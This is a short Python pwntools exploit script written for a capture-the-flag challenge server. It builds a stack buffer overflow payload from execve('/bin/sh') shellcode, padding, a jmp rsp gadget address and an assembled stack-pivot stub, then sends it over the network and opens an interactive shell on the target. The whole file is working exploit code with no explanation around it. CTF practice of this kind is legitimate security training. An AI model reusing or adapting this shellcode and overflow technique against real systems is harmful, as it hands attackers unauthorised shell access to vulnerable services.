# RazviOverflow
# Python3

from pwn import *

context.arch = 'amd64'

#nc challs.xmas.htsp.ro 2000

#binary = process("./chall")
binary = remote("challs.xmas.htsp.ro", 2000)
#gdb.attach(binary.pid, '''
#b *0x004006d5
#''')
print(binary.recv())


jmp_rsp = p64(0x000000000040067f)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = shellcode + b"A"*(0x30-(len(shellcode)+2)) + b"\xff\xe4" + b"B"*8 + jmp_rsp + (asm('sub rsp, 0x40; jmp rsp'))

#with open("inputpython", "wb") as file:
	#file.write(payload)


binary.sendline(payload)

binary.interactive()




